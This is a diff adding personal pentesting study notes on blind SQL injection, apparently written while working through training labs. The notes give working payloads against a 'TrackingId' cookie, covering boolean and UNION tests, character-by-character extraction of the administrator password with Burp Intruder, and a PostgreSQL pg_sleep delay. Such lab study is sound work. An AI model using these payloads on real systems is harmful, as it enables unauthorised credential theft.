@@ -372,9 +372,57 @@ to pull down the db Banner
 
 
 # Blind SQL Injection
+- SQL within Cookie ID
+-- forward intercepted request to locate the session cookie "TrackingId"
+-- send request in repeater a few times checking "Content-Length" does
+not change
+-- If no change check for SQL vuln by add single quote after TrackingId
+----- If the number changes a SQL injection vuln may exist
+----- Compare clean and dirty response code for any differneces
+----- If differences exist I have invoked an error
+-- Test if TrackingId accepts SQL queries with a 'true' statement
+----- ex: TrackingId:4938498'OR+1=1--
+--- Then Deep Test..
+----- ex: TrackingId:4938498'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
+--- Checking password length
+----- ex: TrackingId:4938498'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+----------- then gradually moving greaterthan amount up or down
+----- ...+AND+substring(password,1,1)='a'--
+----------- This would look for the password letter by letter
+----------- password is the object
+----------- first arg is the position of char
+----------- second arg is number of char
+----------- ='a' is the the first char to check if true
+------- Send to intruder (Burp)
+--------- Clear positions
+--------- Setup Payload
+------------ Highlight and 'Add' parameters that will be effected (char position and char being checked)
+------------ tip: use cluster bomb setting
+---------- Setup Payloads
+------------- Payload set numbers go in order of position appearance
+-------------------- Payload Set: 1
+-------------------- Payload type: numbers
+-------------------- Type: Sequential
+-------------------- From: 1
+-------------------- To: 30
+-------------------- Step: 1
+-------------------- Payload Set: 2
+-------------------- Payload type: Simple List
+------------------------ type or add char list file
+----------- Start Attack
+-------------- Very slow and sending all 504 status codes
+-------------- Use "Match" bar in results add column to check off all 'true' matches in source code
+------------------- To add match:
+---------------------- Options -> Grep Match -> clear and enter my 'match'
+
+------- Manual Approach (Blind SQL Injection w/Time Delay
+-- To run a time delay
+--- TrackingID=498378'||pg_sleep(10)--
+------ Every DB command is different
+------ This one is specific to PostgreSQL DB
 
 
-
+######## Directory Path Traversal ########
 
 
 
